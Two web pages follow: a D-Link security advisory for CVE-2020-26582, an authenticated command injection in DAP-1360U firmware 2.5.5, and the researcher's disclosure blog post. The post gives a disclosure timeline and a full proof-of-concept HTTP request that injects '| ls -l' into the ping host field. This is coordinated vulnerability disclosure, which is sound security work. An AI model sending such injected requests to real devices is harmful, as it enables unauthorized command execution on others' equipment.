=== Content from supportannouncement.us.dlink.com_1fc7e333_20250119_113131.html ===


Search by product, keyword, model.

* [Home](http://us.dlink.com/)
  [Support](http://support.dlink.com/index.aspx)
  [Forums](http://forums.dlink.com)
  [Security Advisories](http://support.dlink.com/securityadvisories.aspx)
  [Shop](https://shop.us.dlink.com/)
  US
  ![](https://supportannouncement.us.dlink.com/images/US.gif)
  English
  []

      English | French

Support Announcement

Announcement
>
SAP10191

(Non-US) DAP-1360 :: HW Rev. Ax :: F/W v2.5.5 :: Authenticated Command Injection

**Overview**

On July 4, 2020, a 3rd party security researcher submitted a report accusing the DAP-1360U (non-US) Hardware Revision A1 using firmware v2.5.5 of a Command Injection.  This vulnerability was assigned CVE-2020-26582.  The Vulnerability was confirmed and a patch was issued to close the issue.  Please find the beta/hotfix release below

**3rd Party Report information**

          - **Report provided** Assaf Vilmovski :: wilomousky \_at\_ gmai \_dot\_ com

          - **Reference :**

- Blog Post: <https://wilomousky.blogspot.com/2020/10/dap-1360u-cmdi.html>

- CVE-2020-26582 : <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26582>

**Affected Models**

| **Model** | **Hardware Revision** | **Affected FW** | **Fixed FW** | **Recommendation** | **Last Updated** |
| --- | --- | --- | --- | --- | --- |
| DAP-1360U | All Rev. A Hardware Revisions | v2.5.5 & Below | v3.0.1 Hotfix/Beta | Completed | 07/18/2019 |

**Regarding Security patch for your D-Link Devices**

Firmware updates address the security vulnerabilities in affected D-Link devices. D-Link will update this continually and we strongly recommend all users to install the relevant updates.

Please note that this is a device beta software, beta firmware, or hot-fix release which is still undergoing final testing before its official release. The beta software, beta firmware, or hot-fix is provided on an “as is” and “as available” basis and the user assumes all risk and liability for use thereof. D-Link does not provide any warranties, whether express or implied, as to the suitability or usability of the beta firmware. D-Link will not be liable for any loss, whether such loss is direct, indirect, special or consequential, suffered by any party as a result of their use of the beta firmware.

As there are different hardware revisions on our products, please check this on your device before downloading the correct corresponding firmware update. The hardware revision information can usually be found on the product label on the underside of the product next to the serial number. Alternatively, they can also be found on the device web configuration.

* [Contact Us](http://support.dlink.com/Search.aspx)
* Do Not Sell My Info – CA Residents Only
* Privacy
* Terms of Use
* End of Product Life-Cycle
* [GPL Source Code](http://tsd.dlink.com.tw/gpl2008.asp)



=== Content from wilomousky.blogspot.com_39deadb2_20250119_132250.html ===

[Skip to main content](#main)

### Search This Blog

# [My Security Blog](https://wilomousky.blogspot.com/)

### DAP-1360U CMDi

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

[October 01, 2020](https://wilomousky.blogspot.com/2020/10/dap-1360u-cmdi.html "permanent link")

# DAP-1360U CMDi

## TIMELINE

4/07/2020: Report to d-link
5/07/2020: D-link security team response - waiting for their
verification

15/07/2020: D-link confirms CMDi, providing a firmware for me to test the
fix

18/07/2020: Tested the latest provided firmware, the vulnerability does no
longer exist.

01/10/2020: Going public - took time cause I'v been busy ;)

06/10/2020: [CVE-2020-26582](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26582)

## DAP-1360

The D-Link DAP-1360 Wireless N Range Extender can provide your wired
network with wireless connectivity, or upgrade your existing wireless
network and extend its coverage.

The vulnerability was found on H/W Ver. A1, F/W Ver. 2.5.5, a weakness was
discovered based on the ping functionality in the web interface.

I was provided with F/W 3.0.1 as the fix.

| [DAP-1360U](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8fHmGYIGGYoy0eyMwNY2r-Yt4fXO-YEAJfmwHuNz9YQUacLwr0lB8WxxYdMCJ5ojkX_RW49Pno7cRADvYTp5MGeS_oFimtlbikmzBaHGkLNWsIwjWJcQcZSWTVPZo7eC83SEJacKsiIIe/s800/DAP-1360U_Side.jpg) |
| --- |
| DAP-1360U -  taken from <http://www.dlink.ru/il/products/2/2056.html> |

## POST AUTH - COMMAND INJECTION

Once logged in to the web interface, under the system menu, there is an
option to send a ping.

I found a flaw in the way the command is sent to the OS.

#### original request

GET
/index.cgi?v2=y&proxy=y&rq=y&res\_json=y&res\_data\_type=json&res\_config\_action=3&res\_config\_id=18&res\_buf={%22host%22:%22192.168.0.5%22,%22count%22:1}&res\_struct\_size=0&res\_pos=-1&tokenget=1268&&\_=1593893639702
HTTP/1.1

Host: 192.168.0.50
...
..

To inject our command through this request I found that the IP value in
the json tuple is vulnerable.

If you add '| ls -l"' (pipe <command>), encoded ofcourse:
%7c%20ls%20-l%22, the ping command will be executed, and also the command,
in this case directory listing (ls -l).

You can view/edit/create any folder/file on the web server that the admin
or the user you logged in with is privileged to.

Here is a snapshot from the response:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhawhpD8KPEamHkL0SWWJMG4UjqgJD3ckIkxyQ7BwEBqgDQB570CK4Dvi5XlsCKbQzK9iGLuR4vht7JUWFA0LL7qTiCWRYCVVRsQ5Ut_VU_Nquvpd7QJFPNcrYwcp1tFtY6cgjePRVARt0f/d/Screen+Shot+2020-07-18+at+10.42.45+PM.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhawhpD8KPEamHkL0SWWJMG4UjqgJD3ckIkxyQ7BwEBqgDQB570CK4Dvi5XlsCKbQzK9iGLuR4vht7JUWFA0LL7qTiCWRYCVVRsQ5Ut_VU_Nquvpd7QJFPNcrYwcp1tFtY6cgjePRVARt0f/s857/Screen%2BShot%2B2020-07-18%2Bat%2B10.42.45%2BPM.jpg)

#### How the attacking request will look like

GET
/index.cgi?v2=y&proxy=y&rq=y&res\_json=y&res\_data\_type=json&res\_config\_action=3&res\_config\_id=18&res\_buf={%22host%22:%22192.168.0.52%7c%20ls%20-l%22,%22count%22:1}&res\_struct\_size=0&res\_pos=-1&tokenget=1268&&\_=1593893639702
HTTP/1.1

Host: 192.168.0.50

IMPLICATIOS
Any web interface user will be able to send commands to busybox OS found on
the device.

This opens a door to a wider attack surface including PE, APT and so
forth.

In my tests I was able to CRUD files from OS and issue other OS
commands.

Keeping a communication line with D-link security team, this issue had been
fixed and threat was removed in latest version (F/W 3.0.1).

DLINK's CONFIRM:[D-link confirmation](https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10191)

[CMDi](https://wilomousky.blogspot.com/search/label/CMDi)
[command injection](https://wilomousky.blogspot.com/search/label/command%20injection)
[d-link](https://wilomousky.blogspot.com/search/label/d-link)
[DAP-1360U CMDi](https://wilomousky.blogspot.com/search/label/DAP-1360U%20CMDi)
[exploit](https://wilomousky.blogspot.com/search/label/exploit)
[Hacking](https://wilomousky.blogspot.com/search/label/Hacking)
[vulnerability](https://wilomousky.blogspot.com/search/label/vulnerability)

Location:
[Tel Aviv-Yafo, Israel](https://maps.google.com/maps?q=Tel+Aviv-Yafo,+Israel@32.0852999,34.78176759999999&z=10)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

### Comments

#### Post a Comment

### Popular posts from this blog

[September 09, 2024](https://wilomousky.blogspot.com/2024/09/mass-assignment-vulnerabilities-mass.html "permanent link")

  Mass assignment vulnerabilities! Mass assignment (also known as auto-binding) can inadvertently create hidden parameters.   by Wilomousky Assaf on September 09   Mass assignment (also known as auto-binding) can inadvertently create hidden parameters. It occurs when software frameworks automatically bind request parameters to fields on an internal object. Mass assignment may therefore result in the application supporting parameters that were never intended to be processed by the developer.

[Read more](https://wilomousky.blogspot.com/2024/09/mass-assignment-vulnerabilities-mass.html#more)

### [Safeguarding Your Systems: A Comprehensive Guide to XXE Protection](https://wilomousky.blogspot.com/2024/08/safeguarding-your-systems-comprehensive.html)

[August 14, 2024](https://wilomousky.blogspot.com/2024/08/safeguarding-your-systems-comprehensive.html "permanent link")

  Article by Assaf Wilomousky Introduction XML External Entity (XXE) attacks pose a significant threat to web applications that parse XML input. This article outlines effective strategies to protect your systems from XXE vulnerabilities, drawing on recommendations from the Open Web Application Security Project (OWASP) and industry best practices. Understanding XXE XXE attacks occur when an XML parser processes external entity references within XML documents. Attackers can exploit these references to access sensitive files, perform denial of service attacks, or execute server-side request forgery. OWASP Top 10 Context XXE is listed in the OWASP Top 10 Web Application Security Risks, highlighting its severity and prevalence in modern web applications. Protection Strategies Disable XML External Entities:                                  Configure XML parsers to disable external entity p...

[Read more](https://wilomousky.blogspot.com/2024/08/safeguarding-your-systems-comprehensive.html "Safeguarding Your Systems: A Comprehensive Guide to XXE Protection")

[Powered by Blogger](https://www.blogger.com)

Theme images by [Michael Elkan](http://www.offset.com/photos/394244)

[Assaf Wilomousky](https://www.blogger.com/profile/13481031506794425003)

[Visit profile](https://www.blogger.com/profile/13481031506794425003)

### Archive

* [September 20241](https://wilomousky.blogspot.com/2024/09/)
* [August 20241](https://wilomousky.blogspot.com/2024/08/)
* [October 20201](https://wilomousky.blogspot.com/2020/10/)

### Labels

* [CMDi](https://wilomousky.blogspot.com/search/label/CMDi)
* [command injection](https://wilomousky.blogspot.com/search/label/command%20injection)
* [d-link](https://wilomousky.blogspot.com/search/label/d-link)
* [DAP-1360U CMDi](https://wilomousky.blogspot.com/search/label/DAP-1360U%20CMDi)
* [exploit](https://wilomousky.blogspot.com/search/label/exploit)
* [Hacking](https://wilomousky.blogspot.com/search/label/Hacking)
* [Mass assignment vulnerabilities](https://wilomousky.blogspot.com/search/label/Mass%20assignment%20vulnerabilities)
* [vulnerability](https://wilomousky.blogspot.com/search/label/vulnerability)

### [Report Abuse](https://www.blogger.com/go/report-abuse)


